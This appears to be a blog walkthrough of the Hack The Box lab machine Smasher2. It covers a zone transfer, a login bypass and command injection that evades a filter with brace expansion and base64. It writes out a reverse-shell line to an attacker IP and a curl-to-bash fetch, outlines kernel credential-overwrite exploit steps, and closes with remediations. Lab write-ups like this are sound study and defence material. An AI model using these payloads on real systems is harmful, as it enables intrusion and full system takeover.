<!doctype html><html lang=en><head><title>Smasher2 HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Smasher2 HTB machine featuring DNS zone transfer enumeration, Flask C extension exploitation, reverse engineering with Ghidra, command injection bypass, and kernel module memory mapping privilege escalation"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/smasher2-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Smasher2 HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Smasher2 HTB machine featuring DNS zone transfer enumeration, Flask C extension exploitation, reverse engineering with Ghidra, command injection bypass, and kernel module memory mapping privilege escalation"><meta property="og:url" content="https://malayamanas.github.io/posts/smasher2-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 08:15:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/smasher2-htb-walkthrough/>Smasher2 HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/dns/>dns</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/zone-transfer/>zone-transfer</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/c-extension/>c-extension</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/flask/>flask</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/reverse-engineering/>reverse-engineering</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ghidra/>ghidra</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/gdb/>gdb</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/command-injection/>command-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/kernel-module/>kernel-module</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/memory-mapping/>memory-mapping</a>&nbsp;</span><div class=post-content><div><h1 id=smasher2-htb---insane-linux-box-walkthrough>Smasher2 HTB - Insane Linux Box Walkthrough<a href=#smasher2-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/ELiicja60jI?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=exploitation-steps>Exploitation Steps<a href=#exploitation-steps class=hanchor arialabel=Anchor>#</a></h2><h3 id=enumeration-phase>Enumeration Phase<a href=#enumeration-phase class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Nmap Scan</strong>: Run <code>nmap -sC -sV -oA smasher2 [TARGET-IP]</code> to identify open ports: SSH (22), DNS (53/TCP, ISC BIND), HTTP (80, Apache on Ubuntu). Note DNS on TCP suggests testing zone transfers.</li><li><strong>DNS Zone Transfer</strong>: Use <code>dig axfr @[TARGET-IP] smasher2.htb</code> to dump the zone, revealing subdomain <code>wonderfulsessionmanager.smasher2.htb</code>. Add to hosts file and access the website.</li><li><strong>HTTP Enumeration</strong>: Access <code>http://[TARGET-IP]</code> (403 Forbidden) and <code>http://wonderfulsessionmanager.smasher2.htb</code> (login page). Test default creds (admin/admin, guest/guest) and basic SQL injection, but fails.</li><li><strong>User-Agent Filtering Check</strong>: Analyze Nmap&rsquo;s HTTP probe in Wireshark/Burp; discover blacklist on &ldquo;Nmap Scripting Engine&rdquo;. Use custom user-agent for further scans.</li><li><strong>Directory Brute-Force</strong>: Run Gobuster with <code>gobuster dir -u http://[TARGET-IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a "Mozilla/5.0 (compatible;)" -o gobuster_root.out</code>, finding <code>/backup</code>.</li></ul><h3 id=web-application-analysis-and-bypass>Web Application Analysis and Bypass<a href=#web-application-analysis-and-bypass class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Download Backup Files</strong>: From <code>/backup</code>, download <code>sso.c</code> (C library) and <code>sso.py</code> (Flask app). Note logging to <code>creds.log</code> (forbidden access).</li><li><strong>Source Code Review</strong>: In <code>sso.py</code>, identify login endpoint <code>/auth</code> (POST with JSON data). Calls C functions from <code>sso.so</code>. Grep for functions like <code>log_creds</code>.</li><li><strong>Reverse Engineering with Ghidra</strong>: Decompile <code>sso.so</code>. Analyze <code>session_manager_check_login</code>: Parses POST data, extracts username/password. Bug: <code>get_internal_user</code> and <code>get_internal_pwd</code> both return username from credentials struct, allowing login if password == username.</li><li><strong>Debugging with GDB</strong>: Load in Python2 interpreter, attach GDB to step through <code>check_login</code>, confirm username/password comparison uses same value. Handle segfaults from lockouts.</li><li><strong>Login Bypass</strong>: Brute-force usernames with matching passwords (e.g., &ldquo;Administrator&rdquo;/&ldquo;Administrator&rdquo;). Success grants API key. Lockout (10 attempts) is intended vuln, but bypassed.</li></ul><h3 id=command-execution-and-shell>Command Execution and Shell<a href=#command-execution-and-shell class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>API Endpoint Access</strong>: POST to <code>/api/&lt;api_key>/job</code> with JSON <code>{"schedule": "&lt;command>"}</code>. Test reveals command execution.</li><li><strong>Web Filter Evasion</strong>: Commands with spaces forbidden (403). Use Bash brace expansion (e.g., <code>{echo,test}</code> expands to &ldquo;echo test&rdquo;). Avoid spaces with commas in braces.</li><li><strong>Base64 Encoding for Complex Commands</strong>: Base64-encode payloads (e.g., reverse shell), decode/execute with <code>{base64,-d}|{bash,-i}</code> to evade filters on flags like <code>-d</code>.</li><li><strong>Reverse Shell</strong>: Encode <code>bash -i >& /dev/tcp/[ATTACKER-IP]/9001 0>&amp;1</code>, send via API. Catch with <code>nc -lvnp 9001</code>. Upgrade shell via SSH key drop (generate key, add to <code>.ssh/authorized_keys</code>).</li></ul><h3 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Enumeration with LinPEAS</strong>: Run LinPEAS script (<code>curl [ATTACKER-IP]:9001/linpeas.sh | bash</code>). Highlights unsigned kernel module <code>d_hid.ko</code> (signature verification failed).</li><li><strong>Download and Analyze Module</strong>: SCP <code>d_hid.ko</code> locally, decompile in Ghidra. Identify device <code>/dev/d_hid</code> (block device, registered in init). Read/open functions copy data to user space.</li><li><strong>Memory Mapping Exploit</strong>: Use <code>mmap</code> to map <code>/dev/d_hid</code> (kernel space) to user space. Search mapped memory for credential struct (sequence of UID/GID 1000 x8). Overwrite UIDs/GIDs to 0 (root).</li><li><strong>Exploit Code Development</strong>:<ul><li>Open <code>/dev/d_hid</code> (O_RDWR).</li><li>Map large memory range (e.g., 0x42424242 bytes starting at 0x42424200) with <code>mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)</code>.</li><li>Scan for cred struct: Loop through addresses, check for 8 consecutive UIDs (1000).</li><li>Overwrite: Set UIDs/GIDs to 0, skip secure bits (4 bytes). Set capabilities to 0x1234 (full).</li><li>Launch shell: <code>execl("/bin/sh", "sh", NULL)</code>.</li></ul></li><li><strong>Execution</strong>: Compile exploit.c, run on box. Gains root shell. Note: Overwriting affects all processes if not targeted.</li></ul><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><h3 id=dns-service-isc-bind-on-port-53tcp>DNS Service (ISC BIND on Port 53/TCP)<a href=#dns-service-isc-bind-on-port-53tcp class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap: Unrestricted Zone Transfer (AXFR)</strong>
The DNS server allows zone transfers to unauthorized clients, leaking subdomain information (e.g., wonderfulsessionmanager.smasher2.htb).
<strong>Fix Type: Configuration</strong>
In BIND&rsquo;s named.conf, add <code>allow-transfer { trusted_ips; };</code> to restrict AXFR to specific IP addresses or ACLs.</li></ul><h3 id=http-server-apache-on-port-80>HTTP Server (Apache on Port 80)<a href=#http-server-apache-on-port-80 class=hanchor arialabel=Anchor>#</a></h3><ul><li><p><strong>Gap: User-Agent Based Blacklisting</strong>
The server blocks requests with specific user-agents like &ldquo;Nmap Scripting Engine&rdquo; (403 Forbidden), but it&rsquo;s easily bypassed by changing the user-agent. This indicates incomplete or weak WAF rules.
<strong>Fix Type: Configuration</strong>
Enhance Apache mod_security or .htaccess rules to use more robust filtering (e.g., regex on broader patterns) or remove if not needed; example: <code>&lt;If "%{HTTP_USER_AGENT} =~ /nmap/i"> Deny from all &lt;/If></code> but expand to cover variations.</p></li><li><p><strong>Gap: Exposed Backup Directory</strong>
The /backup directory is accessible, allowing download of sensitive files like sso.py and sso.c, exposing source code.
<strong>Fix Type: Configuration</strong>
In Apache config (e.g., sites-available), add <code>&lt;Directory /backup> Require all denied &lt;/Directory></code> or use .htaccess with <code>Deny from all</code> to block access.</p></li><li><p><strong>Gap: File Access Restrictions Bypassed Indirectly</strong>
Files like creds.log are forbidden (403), but the restriction is filename-based and doesn&rsquo;t prevent inference or other access attempts.
<strong>Fix Type: Configuration</strong>
Strengthen Apache rules with mod_rewrite or mod_security to block patterns like <code>RewriteRule ^.*(creds\.log|threads\.log)$ - [F]</code> and ensure no directory traversal.</p></li></ul><h3 id=web-application-flask-app-with-c-extension---ssopy-and-ssoso>Web Application (Flask App with C Extension - sso.py and sso.so)<a href=#web-application-flask-app-with-c-extension---ssopy-and-ssoso class=hanchor arialabel=Anchor>#</a></h3><ul><li><p><strong>Gap: Login Bypass Due to Bug in Credential Retrieval</strong>
In sso.so, get_internal_user and get_internal_pwd both return the username from the credentials struct, allowing login if password matches username.
<strong>Fix Type: Source Code</strong>
Modify get_internal_pwd in sso.c to correctly return the password (e.g., return credentials[1] instead of credentials[0]).</p></li><li><p><strong>Gap: Weak Lockout Mechanism (Intended for Garbage Collection Dereference Exploit)</strong>
The 10-attempt lockout can be exploited via Python garbage collection dereferencing, leading to unintended access.
<strong>Fix Type: Source Code</strong>
In sso.py/sso.so, properly manage object references in check_login (e.g., use Py_INCREF/Py_DECREF correctly) and strengthen lockout logic to avoid dereference vulnerabilities.</p></li><li><p><strong>Gap: Command Execution via API Endpoint</strong>
The /api/<key>/job endpoint executes arbitrary commands from the &ldquo;schedule&rdquo; JSON parameter.
<strong>Fix Type: Source Code</strong>
In sso.py, replace direct execution (e.g., os.system or subprocess) with sanitized whitelisting or remove execution; example: validate input against allowed commands list before running.</p></li><li><p><strong>Gap: Bypassed Web Filter on Command Inputs</strong>
Filter blocks spaces and flags (e.g., -d in base64), but bypassable via Bash brace expansion (e.g., {base64,-d}) or commas.
<strong>Fix Type: Source Code/Configuration</strong>
In sso.py, enhance input sanitization to detect and strip brace expansions (e.g., regex replace /{.*}/ with safe parsing); or configure a WAF like mod_security to block such patterns in POST data.</p></li></ul><h3 id=kernel-module-d_hidko>Kernel Module (d_hid.ko)<a href=#kernel-module-d_hidko class=hanchor arialabel=Anchor>#</a></h3><ul><li><p><strong>Gap: Unsigned Kernel Module Loaded</strong>
The module lacks signature verification, allowing potentially malicious modules to load.
<strong>Fix Type: Configuration</strong>
Enable kernel module signing in /etc/modprobe.d or kernel boot params (e.g., module.sig_enforce=1) to require signatures.</p></li><li><p><strong>Gap: Memory Mapping Vulnerability Allowing Credential Overwrite</strong>
The module&rsquo;s mmap handler maps kernel space to user space without protections, enabling searches and overwrites of credential structures.
<strong>Fix Type: Source Code</strong>
In d_hid.ko source, add checks in mmap/open/read functions (e.g., verify_user_ptr, restrict mapping size/offsets) to prevent kernel-to-user mappings; example: return -EPERM if offset or size exceeds safe bounds.</p></li></ul><h2 id=conclusion>Conclusion<a href=#conclusion class=hanchor arialabel=Anchor>#</a></h2><p>Smasher2 is an excellent machine that demonstrates the complexity of modern web applications with native extensions and kernel-level vulnerabilities. It requires expertise in:</p><ul><li>DNS zone transfer enumeration and information gathering</li><li>Flask application security and C extension analysis</li><li>Reverse engineering with tools like Ghidra and GDB</li><li>Command injection bypass techniques and web filter evasion</li><li>Kernel module analysis and memory mapping exploitation</li><li>Advanced privilege escalation through credential structure manipulation</li></ul><p>The machine emphasizes the importance of proper input validation, secure coding practices in native extensions, kernel module security, and comprehensive system hardening.</p><hr><p><em>This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.</em></p></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>Â© 2025 Powered by <a href=https://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>